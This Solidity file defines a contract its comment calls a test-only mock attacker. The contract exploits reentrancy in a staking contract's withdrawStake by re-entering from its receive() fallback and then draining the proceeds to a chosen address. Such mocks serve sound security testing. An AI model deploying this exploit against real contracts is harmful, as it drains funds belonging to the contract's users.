// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

interface IStakeTarget {
    function depositStake() external payable;
    function withdrawStake() external;
}

/// @notice Mock penyerang (hanya untuk pengujian) - mengeksploitasi reentrancy pada withdrawStake.
contract ReentrancyAttacker {
    IStakeTarget public immutable target;
    uint256 public reentries;

    constructor(address t) { target = IStakeTarget(t); }

    function attack() external payable {
        target.depositStake{value: msg.value}();
        target.withdrawStake();
    }

    receive() external payable {
        if (address(target).balance >= msg.value && reentries < 20) {
            reentries++;
            target.withdrawStake();
        }
    }

    function drainToOwner(address payable to) external { to.transfer(address(this).balance); }
}
